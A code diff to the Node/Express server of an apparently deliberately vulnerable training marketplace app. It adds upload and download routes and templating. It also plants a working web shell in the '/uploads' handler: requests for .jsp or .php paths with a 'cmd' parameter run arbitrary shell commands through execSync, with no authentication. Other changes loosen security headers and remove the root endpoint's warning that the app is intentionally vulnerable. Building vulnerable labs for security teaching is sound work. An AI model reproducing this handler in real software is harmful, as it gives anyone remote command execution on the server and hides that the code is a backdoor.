@@ -4,9 +4,10 @@ const helmet = require('helmet');
 const morgan = require('morgan');
 const cookieParser = require('cookie-parser');
 const session = require('express-session');
+const fileupload = require("express-fileupload");
 const path = require('path');
 const { createServer } = require('http');
-const { Server } = require('socket.io');
+const socketio = require('socket.io');
 const PortManager = require('./utils/portManager');
 require('dotenv').config();
 
@@ -19,6 +20,8 @@ const transactionRoutes = require('./routes/transactions');
 const notificationRoutes = require('./routes/notifications');
 
 const communityRoutes = require('./routes/community');
+const uploadRoutes = require('./routes/upload');
+const downloadRoutes = require('./routes/download');
 
 // Import middleware
 const authenticateToken = require('./middleware/authenticateToken');
@@ -28,13 +31,30 @@ const { connectDB, sequelize } = require('./config/database');
 // Import models for health check
 const User = require('./models/User');
 const Product = require('./models/Product');
+const Transaction = require('./models/Transaction');
 const CommunityPost = require('./models/CommunityPost');
 
-// Model associations are handled in individual model files
+// Initialize model associations
+const models = { User, Product, Transaction, CommunityPost };
+Object.keys(models).forEach(modelName => {
+  if (models[modelName].associate) {
+    models[modelName].associate(models);
+  }
+});
 
 const app = express();
+
+// EJS 템플릿 엔진 설정
+app.set('view engine', 'ejs');
+app.set('views', path.join(__dirname, 'views'));
+
+// 커스텀 EJS 적용 (communityHelpers 포함)
+const customEjs = require('./utils/customEjs');
+app.locals.ejs = customEjs;
+app.locals.communityHelpers = customEjs.communityHelpers;
+
 const httpServer = createServer(app);
-const io = new Server(httpServer, {
+const io = socketio(httpServer, {
   cors: {
     origin: process.env.FRONTEND_URL || 'http://localhost:3000',
     credentials: true
@@ -48,7 +68,8 @@ connectDB();
 app.use(helmet({
   contentSecurityPolicy: false, // Disabled for XSS vulnerabilities
   frameguard: false, // Disabled for clickjacking
-  crossOriginResourcePolicy: { policy: 'cross-origin' }
+  crossOriginResourcePolicy: { policy: 'cross-origin' },
+  crossOriginEmbedderPolicy: false // Disable COEP for file downloads
 }));
 
 // CORS configuration (intentionally permissive)
@@ -61,6 +82,9 @@ app.use(cors({
 
 // Logging
 app.use(morgan('dev'));
+
+// File upload middleware
+app.use(fileupload({ parseNested: true }));
 
 // Body parsing
 app.use(express.json({ limit: '50mb' })); // Intentionally high limit
@@ -79,8 +103,90 @@ app.use(session({
   }
 }));
 
-// Static files (intentionally expose uploads directory)
-app.use('/uploads', express.static(path.join(__dirname, '../uploads')));
+// Modified static file serving - allow webshell execution and file downloads
+app.use('/uploads', (req, res, next) => {
+  // Set CORS headers for uploaded files
+  res.header('Access-Control-Allow-Origin', '*');
+  res.header('Access-Control-Allow-Methods', 'GET');
+  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
+  res.header('Cross-Origin-Resource-Policy', 'cross-origin');
+  
+  const ext = path.extname(req.path).toLowerCase();
+  
+  // Force download if ?download=true is specified
+  if (req.query.download === 'true') {
+    const filename = path.basename(req.path);
+    res.header('Content-Disposition', `attachment; filename="${filename}"`);
+    next();
+    return;
+  }
+  
+  // Webshell execution: For JSP, PHP files - execute shell commands when accessed directly
+  if (ext === '.jsp' || ext === '.php') {
+    const cmd = req.query.cmd;
+    if (cmd) {
+      try {
+        const { execSync } = require('child_process');
+        console.log(`Executing command: ${cmd}`);
+        const output = execSync(cmd, { encoding: 'utf8', timeout: 5000 });
+        res.type('text/plain').send(`Command: ${cmd}\n\nOutput:\n${output}`);
+        return;
+      } catch (error) {
+        res.type('text/plain').send(`Command: ${cmd}\n\nError:\n${error.message}`);
+        return;
+      }
+    } else {
+      res.type('text/plain').send('Webshell ready. Use ?cmd=<command> to execute commands.');
+      return;
+    }
+  }
+  
+  // Set proper Content-Type for all files - support all extensions for download
+  const mimeTypes = {
+    '.jpg': 'image/jpeg',
+    '.jpeg': 'image/jpeg',  
+    '.png': 'image/png',
+    '.gif': 'image/gif',
+    '.pdf': 'application/pdf',
+    '.doc': 'application/msword',
+    '.docx': 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
+    '.txt': 'text/plain',
+    '.jsp': 'text/plain',
+    '.php': 'text/plain',
+    '.js': 'application/javascript',
+    '.html': 'text/html',
+    '.css': 'text/css',
+    '.exe': 'application/octet-stream',
+    '.zip': 'application/zip',
+    '.rar': 'application/x-rar-compressed',
+    '.7z': 'application/x-7z-compressed',
+    '.xml': 'text/xml',
+    '.json': 'application/json',
+    '.sql': 'text/plain',
+    '.bat': 'text/plain',
+    '.cmd': 'text/plain',
+    '.py': 'text/plain',
+    '.java': 'text/plain',
+    '.c': 'text/plain',
+    '.cpp': 'text/plain',
+    '.h': 'text/plain',
+    '.log': 'text/plain'
+  };
+  
+  if (mimeTypes[ext]) {
+    res.header('Content-Type', mimeTypes[ext]);
+  } else {
+    // Unknown extensions - serve as downloadable binary
+    res.header('Content-Type', 'application/octet-stream');
+  }
+  
+  next();
+}, express.static(path.join(__dirname, 'uploads'), {
+  setHeaders: (res, path, stat) => {
+    // Additional security headers for static files
+    res.set('X-Content-Type-Options', 'nosniff');
+  }
+}));
 
 // API Routes
 app.use('/api/auth', authRoutes);
@@ -91,6 +197,8 @@ app.use('/api/transactions', transactionRoutes);
 app.use('/api/notifications', notificationRoutes);
 
 app.use('/api/community', authenticateToken, communityRoutes);
+app.use('/api/upload', authenticateToken, uploadRoutes);
+app.use('/api/download', downloadRoutes);
 
 // Health check endpoint
 app.get('/api/health', async (req, res) => {
@@ -133,22 +241,11 @@ app.get('/api/health', async (req, res) => {
 
 // Root endpoint
 app.get('/', (req, res) => {
-  res.json({
-    message: 'Vintage Market API - Educational Security Testing Platform',
-    warning: '⚠️ This API contains intentional security vulnerabilities for educational purposes only!',
-    status: 'Server is running successfully',
-    timestamp: new Date().toISOString(),
-    endpoints: {
-      api: '/api',
-      auth: '/api/auth',
-      users: '/api/users',
-      products: '/api/products',
-      chat: '/api/chat',
-      transactions: '/api/transactions',
-      notifications: '/api/notifications',
-      community: '/api/community',
-      health: '/api/health'
-    }
+  res.render('index', {
+    platform: process.platform,
+    nodeVersion: process.version,
+    environment: process.env.NODE_ENV || 'development',
+    uptime: process.uptime()
   });
 });
 
